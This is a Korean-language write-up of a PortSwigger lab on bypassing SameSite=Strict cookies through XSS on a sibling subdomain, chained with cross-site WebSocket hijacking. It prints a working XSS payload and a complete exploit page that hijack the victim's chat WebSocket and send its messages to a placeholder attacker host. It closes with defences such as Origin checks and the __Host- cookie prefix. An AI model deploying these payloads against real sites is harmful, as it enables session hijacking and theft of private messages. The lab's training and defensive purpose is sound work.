# Lab: SameSite Strict bypass via sibling domain

## 개요

- **난이도**: Practitioner
- **주제**: Cross-Site Request Forgery (CSRF) — SameSite=Strict 우회 / Sibling Domain / XSS / WebSocket 하이재킹 (CSWSH)
- **링크**: https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-sibling-domain

## 목표

`SameSite=Strict` 쿠키로 보호된 WebSocket 채팅 기능을 공격한다. 형제 서브도메인(`cms.`)의 XSS를 통해 same-site 컨텍스트를 확보한 뒤, 피해자의 WebSocket 세션을 하이재킹하여 채팅 히스토리를 탈취한다.

## SameSite 와 서브도메인(Sibling Domain)의 관계

```
Same-site 판단 기준: eTLD+1 (effective Top-Level Domain + 1)

예시:
  https://web-security-academy.net          (메인)
  https://cms.web-security-academy.net      (CMS 서브도메인)
  → eTLD+1 동일: web-security-academy.net
  → 둘은 "same-site" ← 핵심!

SameSite=Strict 에서:
  외부 사이트(evil.com) → web-security-academy.net  : 쿠키 미전송 (차단)
  cms.web-security-academy.net → web-security-academy.net : 쿠키 전송! (same-site)

→ cms. 서브도메인이 침해되면 메인 도메인의 SameSite=Strict 쿠키를 활용 가능
```

## 취약점 체인

```
[취약점 1] CMS 서브도메인 XSS
  https://cms.web-security-academy.net 에 XSS 존재
  → 공격자가 피해자 브라우저에서 cms. 컨텍스트로 JS 실행 가능

[취약점 2] WebSocket 연결에 SameSite 쿠키 의존
  https://web-security-academy.net 의 채팅 기능:
  → WebSocket 업그레이드 요청에 session 쿠키 포함
  → 세션 인증으로 채팅 히스토리 제공

[공격 체인]
  evil.com → cms. XSS 실행 → same-site 컨텍스트 확보
           → 메인 도메인 WebSocket 연결 (쿠키 자동 첨부)
           → 채팅 히스토리 수신 → 공격자 서버로 전송
```

## WebSocket 하이재킹 (CSWSH) 상세

### WebSocket 핸드셰이크

```http
GET /chat HTTP/1.1
Host: web-security-academy.net
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZQ==
Sec-WebSocket-Version: 13
Cookie: session=VICTIM_SESSION   ← 쿠키 자동 첨부
Origin: https://cms.web-security-academy.net  ← same-site → 허용!
```

```
서버:
  Origin 확인: cms. ↔ web-security-academy.net → same-site → 허용
  Cookie: session 유효 → 피해자 채팅 세션 연결
  → 채팅 히스토리 전송 시작
```

### 일반 크로스 사이트 vs Sibling Domain 비교

```
[evil.com 에서 직접 시도]
  WebSocket: wss://web-security-academy.net/chat
  Origin: https://evil.com
  Cookie: (SameSite=Strict → 미전송)
  → 서버: 인증 실패 (세션 쿠키 없음) → 거부

[cms.web-security-academy.net XSS 통해]
  WebSocket: wss://web-security-academy.net/chat
  Origin: https://cms.web-security-academy.net
  Cookie: session=VICTIM_SESSION (SameSite=Strict → same-site → 전송!)
  → 서버: 세션 유효 → 피해자 채팅 세션 연결 → 하이재킹 성공
```

## 공격 단계

### 1단계: CMS XSS 취약점 확인

```
cms.web-security-academy.net 에서 XSS 포인트 탐색:
  - 로그인 폼의 username/password 파라미터
  - 검색, 댓글 등 사용자 입력 반영 위치

취약한 로그인 폼 예시:
  POST /login
  username=<script>...</script>&password=...
  → 오류 메시지에 username 그대로 반영 → Reflected XSS
```

### 2단계: XSS 페이로드 — WebSocket 하이재킹

```javascript
// cms. XSS 에서 실행될 페이로드
<script>
var ws = new WebSocket('wss://web-security-academy.net/chat');
ws.onopen = function() {
    ws.send('READY');  // 채팅 서버에 히스토리 요청
};
ws.onmessage = function(event) {
    // 수신한 메시지를 공격자 서버로 전송
    fetch('https://ATTACKER-SERVER.com/log?msg=' + btoa(event.data));
};
</script>
```

### 3단계: 피해자에게 전달할 최종 페이로드

```html
<!-- exploit server 에 호스팅 -->
<html>
  <body>
    <script>
      // CMS 로그인 엔드포인트에 XSS 삽입
      // username 파라미터가 오류 메시지에 반영되는 취약점 이용
      const xssPayload = `<script>
        var ws = new WebSocket('wss://web-security-academy.net/chat');
        ws.onopen = function() { ws.send('READY'); };
        ws.onmessage = function(e) {
          fetch('https://ATTACKER.com/log?d=' + btoa(e.data));
        };
      <\/script>`;

      // URL 인코딩 후 CMS 에 POST (form 이용)
    </script>

    <form id="f" action="https://cms.web-security-academy.net/login"
          method="POST" target="hidden_frame">
      <input type="hidden" name="username" id="payload">
      <input type="hidden" name="password" value="anything">
    </form>

    <iframe name="hidden_frame" style="display:none"></iframe>

    <script>
      document.getElementById('payload').value =
        '<script>var ws=new WebSocket("wss://web-security-academy.net/chat");' +
        'ws.onopen=function(){ws.send("READY")};' +
        'ws.onmessage=function(e){fetch("https://ATTACKER.com/log?d="+btoa(e.data))};' +
        '<\/script>';
      document.getElementById('f').submit();
    </script>
  </body>
</html>
```

### 4단계: 전체 공격 흐름

```
1. 피해자가 evil.com/exploit 방문

2. evil.com:
   CMS 로그인 폼에 XSS 페이로드를 username 으로 POST 전송
   (hidden iframe 안에서 실행)

3. cms.web-security-academy.net:
   XSS 반영 → 피해자 브라우저에서 JS 실행
   컨텍스트: cms. 도메인 (same-site!)

4. XSS JS 실행:
   wss://web-security-academy.net/chat 에 WebSocket 연결
   요청 헤더:
     Origin: https://cms.web-security-academy.net (same-site → 허용)
     Cookie: session=VICTIM_SESSION (SameSite=Strict → same-site → 전송!)

5. 서버: 세션 유효 → 피해자의 채팅 히스토리 전송

6. XSS JS: 수신 데이터 → ATTACKER.com/log 로 전송

7. 공격자: 채팅 히스토리에서 민감 정보(비밀번호 등) 탈취
```

## 이전 랩들과의 비교

| 항목 | 008 랩 | 009 랩 (이번) |
|------|--------|--------------|
| 우회 대상 | SameSite=Strict | SameSite=Strict |
| 우회 방법 | 클라이언트 사이드 리다이렉트 + 경로 순회 | Sibling Domain XSS |
| 필요 조건 | JS 리다이렉트 경로가 파라미터화 | 형제 서브도메인에 XSS 존재 |
| 공격 목적 | 이메일 변경 (GET 요청) | WebSocket 세션 하이재킹 |
| 2차 공격 | 없음 | XSS → WebSocket 연결 체인 |

## 핵심 정리

- `SameSite=Strict` 는 외부 사이트를 차단하지만 **같은 eTLD+1 내 서브도메인은 same-site** 로 허용된다.
- 형제 서브도메인(`cms.`)에 XSS가 있으면, 그 컨텍스트에서 메인 도메인으로의 요청은 same-site 취급 → 쿠키 첨부.
- WebSocket은 HTTP 쿠키를 그대로 사용하므로, CSWSH(Cross-Site WebSocket Hijacking) 공격이 가능하다.
- **방어**:
  - WebSocket 업그레이드 요청의 `Origin` 헤더 검증 (허용 목록: 정확히 메인 도메인만)
  - 모든 서브도메인의 XSS 취약점 제거 (서브도메인도 same-site 보안 경계)
  - WebSocket 연결에 별도 CSRF 토큰 또는 nonce 추가
  - `__Host-` 쿠키 접두사 사용 (서브도메인 간 쿠키 격리)

## 배운 점 및 추가 학습

### 1. WebSocket 과 CSRF (CSWSH)

```
일반 HTTP 요청 CSRF:
  브라우저가 폼 또는 fetch 로 요청
  → SameSite, CSRF 토큰으로 방어

WebSocket CSRF (CSWSH):
  WebSocket 핸드셰이크도 HTTP 요청
  → 쿠키 자동 첨부
  → SameSite 정책 적용

  그러나 WebSocket 은:
  1. CSRF 토큰 내장 메커니즘 없음
  2. Origin 헤더 검증을 서버가 직접 구현해야 함
  3. 미검증 시 → 크로스 오리진에서도 연결 가능
```

### 2. `__Host-` 쿠키 접두사

```
Set-Cookie: __Host-session=VALUE; Secure; Path=/; HttpOnly

__Host- 접두사 효과:
  - Secure 필수 (HTTPS 만)
  - Path=/ 필수 (루트 경로)
  - Domain 설정 불가 → 서브도메인 공유 차단!

비교:
  Set-Cookie: session=VALUE; Domain=.web-security-academy.net
  → cms., app., 모든 서브도메인에서 전송

  Set-Cookie: __Host-session=VALUE; Secure; Path=/
  → Domain 미설정 → 정확히 현재 호스트만 해당
  → cms. 에서 web-security-academy.net 쿠키 접근 불가

→ 이 랩처럼 sibling domain 침해를 통한 쿠키 유출 방지
```

### 3. WebSocket Origin 검증 구현

```javascript
// Node.js / ws 라이브러리 예시
const wss = new WebSocket.Server({
    server,
    verifyClient: (info) => {
        const origin = info.origin;
        const allowed = ['https://web-security-academy.net'];

        // 정확히 일치하는 도메인만 허용
        // → cms.web-security-academy.net 차단
        return allowed.includes(origin);
    }
});

// 잘못된 구현 (서브도메인 포함 허용):
// if (origin.endsWith('web-security-academy.net')) → 위험!
// → cms.evil.web-security-academy.net.attacker.com 같은 우회 가능
```

### 4. Same-site vs Same-origin 정리

```
Same-site (SameSite 쿠키 기준):
  eTLD+1 이 같으면 same-site
  https://foo.example.com ↔ https://bar.example.com → same-site
  http:// ↔ https:// example.com → Schemeful same-site 에서는 다름
                                   (기본 SameSite 구현에 따라 다름)

Same-origin (CORS 기준):
  scheme + host + port 모두 동일해야 함
  https://foo.example.com ↔ https://bar.example.com → cross-origin!
  → CORS 헤더 없으면 fetch 차단

이번 랩의 구조:
  CMS(https://cms.) → 메인(https://web-security-academy.net)
  - SameSite 관점: same-site → 쿠키 전송 허용
  - CORS 관점: cross-origin → 단, WebSocket 은 CORS 적용 안 됨
                (Origin 헤더는 있지만 preflight 없음)
```

### 5. CSRF 방어 전략 종합

```
[SameSite=Strict 만 사용]
  ✓ 외부 사이트 POST 차단
  ✗ Sibling Domain XSS 에 취약
  ✗ 클라이언트 사이드 리다이렉트 우회 가능

[SameSite=Strict + CSRF 토큰]
  ✓ 위의 취약점 보완
  ✓ Sibling Domain XSS → CSRF 토큰 획득 불가 (token은 HTML에서만)
  ✗ WebSocket 은 토큰 체계 별도 구현 필요

[SameSite=Strict + CSRF 토큰 + Origin 검증 + 서브도메인 XSS 제거]
  가장 강력한 방어 조합
```
